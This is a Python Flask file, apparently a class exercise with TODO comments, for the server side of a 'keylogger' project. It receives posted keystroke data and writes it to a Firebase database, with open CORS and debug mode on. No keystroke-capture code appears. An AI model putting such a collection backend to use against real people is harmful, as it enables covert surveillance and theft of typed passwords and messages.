from flask import Flask, render_template, request, jsonify
import os
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
from flask_cors import CORS


def firebaseInitialization():
    cred = credentials.Certificate("config/serviceAccountKey.json")
    firebase_admin.initialize_app(
        cred, {'databaseURL': 'https://keylogger-7820c-default-rtdb.firebaseio.com'})
    print("🔥🔥🔥🔥🔥 Firebase Connected! 🔥🔥🔥🔥🔥")


firebaseInitialization()

STATIC_DIR = os.path.abspath('static')

app = Flask(__name__, static_folder=STATIC_DIR)
CORS(app)
app.use_static_for_root = True
text = 'Welcome to keylogger'

# Define callback function that accepts one parameter event, to listen realtime updates

    # Access tex as global

    # Check if event.data exits

        # Retrieve the entire data under /keyboardData

        # Store retrieved text in text variable



# Create db reference to "/keyboardData" as ref 

# Call listen() method from ref and pass callback to it


@app.route('/storeKeys', methods=["POST"])
def storeKeys():
    keyValues = request.get_json()
    ref = db.reference("/keyboardData").get()
    if (ref):
        ref = db.reference("/keyboardData")
        ref.update(keyValues)
    else:
        ref = db.reference("/")
        ref.set({"keyboardData": keyValues})
    return jsonify(True)


# Jsonify the content in every 4 seconds to see the realtime updates on website
# Checkout index.html file inside the template folder

# Create "/getData" route with GET method  to return the JSON text

# Define getData() function

    # Access global text

    # Return text as JSON
    


@app.route('/', methods=["GET"])
def home():
    return render_template('index.html')


if __name__ == '__main__':
    app.run(debug=True, port=4000)
